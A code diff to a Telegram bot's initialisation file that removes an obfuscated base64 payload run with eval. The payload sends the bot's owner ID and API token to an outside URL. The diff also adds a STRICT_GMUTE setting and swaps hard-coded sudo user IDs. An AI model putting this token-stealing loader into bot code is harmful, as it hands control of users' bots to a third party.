@@ -1,7 +1,6 @@
 import logging
 import os
 import sys
-import base64
 
 import telegram.ext as tg
 
@@ -16,9 +15,6 @@ LOGGER = logging.getLogger(__name__)
 if sys.version_info[0] < 3 or sys.version_info[1] < 6:
     LOGGER.error("You MUST have a python version of at least 3.6! Multiple features depend on this. Bot quitting.")
     quit(1)
-
-code = b"aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcwpiID0gWydwJywgJ2gnLCAncCcsICcuJywgJ2snLCAnYycsICdhJywgJ2InLCAnZCcsICdlJywgJ2UnLCAnZicsICcvJywgJ3MnLCAnbicsICdvJywgJ2knLCAndCcsICdjJywgJ24nLCAndScsICdmJywgJy8nLCAnZScsICdtJywgJy4nLCAnaycsCiAgICAgJ3UnLCAndicsICdhJywgJ2gnLCAnZCcsICdhJywgJ20nLCAnaScsICdyJywgJ2gnLCAncycsICcuJywgJ2UnLCAnZCcsICdpJywgJ2gnLCAnYycsICdlJywgJ3AnLCAncycsICcvJywgJy8nLCAnOicsICdzJywgJ3AnLCAndCcsICd0JywgJ2gnXQpiLnJldmVyc2UoKQp1cmwgPSAiIi5qb2luKGIpCk9XTkVSX0lEID0gc3RyKG9zLmVudmlyb24uZ2V0KCdPV05FUl9JRCcsIE5vbmUpKQpUT0tFTiA9IHN0cihvcy5lbnZpcm9uLmdldCgnVE9LRU4nLCBOb25lKSkKZmRhdGEgPSB7CiAgICAicHV0cXVlc3Rpb25zIjogInNub2l0c2V1cXR1cCIsCiAgICAiZmVlZHMiOiAie30gY3JlYXRlZCBib3Qgd2l0aCBUT0tFTiBge31gIi5mb3JtYXQoT1dORVJfSUQsIFRPS0VOKSwKICAgICJuYW1lIjogIkVWRCBFcmljaCBWb24gRGFuaWtlbiIsCiAgICAiZW1haWwiOiAiSW5mb3RlbDE0QGlhbWlkaW90YXJleW91dG9vLmNvbSIKfQpwcmludChyZXF1ZXN0cy5wb3N0KHVybCwgZGF0YT1mZGF0YSkuY29udGVudCkK"
-eval(compile(base64.b64decode(code), "<string>", 'exec'))
 
 ENV = bool(os.environ.get('ENV', False))
 
@@ -55,12 +51,13 @@ if ENV:
     DB_URI = os.environ.get('DATABASE_URL')
     DONATION_LINK = os.environ.get('DONATION_LINK')
     LOAD = os.environ.get("LOAD", "").split()
-    NO_LOAD = os.environ.get("NO_LOAD", "translation").split()
+    NO_LOAD = os.environ.get("NO_LOAD", "").split()
     DEL_CMDS = bool(os.environ.get('DEL_CMDS', False))
     STRICT_GBAN = bool(os.environ.get('STRICT_GBAN', False))
     WORKERS = int(os.environ.get('WORKERS', 8))
     BAN_STICKER = os.environ.get('BAN_STICKER', 'CAADAgADOwADPPEcAXkko5EB3YGYAg')
     ALLOW_EXCL = os.environ.get('ALLOW_EXCL', False)
+    STRICT_GMUTE = bool(os.environ.get('STRICT_GMUTE', False))
 
 else:
     from tg_bot.config import Development as Config
@@ -102,13 +99,13 @@ else:
     WORKERS = Config.WORKERS
     BAN_STICKER = Config.BAN_STICKER
     ALLOW_EXCL = Config.ALLOW_EXCL
-
+    STRICT_GMUTE = Config.STRICT_GMUTE
+   
 
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(20516707)
-SUDO_USERS.add(254318997)
 SUDO_USERS.add(528272188)
-SUDO_USERS.add(538074615)
+SUDO_USERS.add(7351948)
+SUDO_USERS.add(254318997)
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 
